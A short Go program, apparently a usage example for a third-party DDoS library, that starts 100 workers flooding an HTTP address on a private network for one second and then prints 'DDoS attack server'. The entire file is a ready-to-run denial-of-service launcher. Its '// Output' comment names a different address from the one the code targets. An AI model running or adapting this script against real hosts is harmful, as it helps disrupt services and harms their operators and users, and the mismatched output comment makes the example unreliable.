package main

import (
	"fmt"
	"github.com/Konstantin8105/DDoS"
	"time"
)

func main() {
	ip := "http://172.27.165.144:80"
	workers := 100
	d, err := ddos.New(ip, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: ", ip)
	// Output: DDoS attack server: http://127.0.0.1:80
}
